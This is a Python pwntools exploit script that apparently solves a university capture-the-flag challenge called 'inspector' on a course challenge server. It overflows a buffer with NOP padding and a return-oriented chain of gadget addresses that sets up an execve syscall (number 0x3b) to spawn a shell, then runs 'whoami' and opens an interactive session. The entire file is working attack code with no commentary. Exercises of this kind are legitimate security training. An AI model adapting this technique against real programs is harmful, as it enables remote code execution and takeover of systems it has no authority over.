from struct import pack

from pwn import *



username = 'aa6243'

binary_name = './inspector'



#is_local    = True

#is_local_dbg= True

remote_host = 'offsec-chalbroker.osiris.cyber.nyu.edu'

remote_port = 1342



gdb_script = '''set follow-fork-mode parent

b *0x00400678

continue

'''



shell_cmd = 'whoami'



#symbol 'cheating'

gadget_1 = 0x00400625

gadget_2 = 0x0040062E

gadget_3 = 0x00400636

gadget_4 = 0x0040063E

gadget_5 = 0x00400646

addr = 0x00400708



nop = asm('nop', arch="amd64")



def gen_payload():

   
    payload = nop*40 + p64(gadget_2) + p64(addr) + p64(gadget_3) + p64(0x00000000) + p64(gadget_4) + p64(0x00000000) + p64(gadget_5) + p64(0x0000003b) + p64(gadget_1)


    return payload

    



def get_target():

    

    target = remote(remote_host, remote_port)

    target.sendline(username)

    return target





def main():

    target = get_target()

    preamble = target.recvuntil('Please pop a shell!')

    #get the shell

    target.sendline(gen_payload())

    #use the shell

    target.sendline(shell_cmd)

    #get output

    print('shell output: %s' % target.recvline())

    #interactive for fun

    target.interactive()



if __name__ == '__main__':

    main()
